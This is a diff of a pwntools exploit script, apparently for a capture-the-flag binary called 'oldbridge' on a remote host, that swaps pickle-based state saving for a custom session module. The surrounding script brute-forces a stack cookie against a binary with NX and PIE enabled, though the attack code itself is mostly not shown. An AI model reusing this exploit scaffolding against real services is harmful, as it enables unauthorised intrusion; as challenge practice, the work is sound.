@@ -3,7 +3,7 @@
 # This exploit template was generated via:
 # $ pwn template ./exe/oldbridge --host 88.198.233.174 --port 32922
 from pwn import *
-from pickle import load, dump
+from session import * # custom module for saving data
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('./exe/oldbridge')
@@ -55,8 +55,10 @@ continue
 # NX:       NX enabled
 # PIE:      PIE enabled
 
-# configuration vars
+# create session
 config = {}
+create_session("oldbridge", args.LOCAL)
+
 # username found in binary
 config['username'] = ''.join(str(chr(ord(x) ^ 13)) for x in "il{dih")
 # buffer size
@@ -109,7 +111,7 @@ def brute_force_cookie(logging = False):
 
 # load session
 if args.LOAD:
-    load_vars()
+    config = load_vars()
     log.info("Load session {}".format(config))
 
 # we need the stack cookie to do a proper exploit
@@ -125,4 +127,4 @@ data_recv = io.clean()
 print (data_recv)
 
 # save the session
-save_vars()
+save_vars(config)
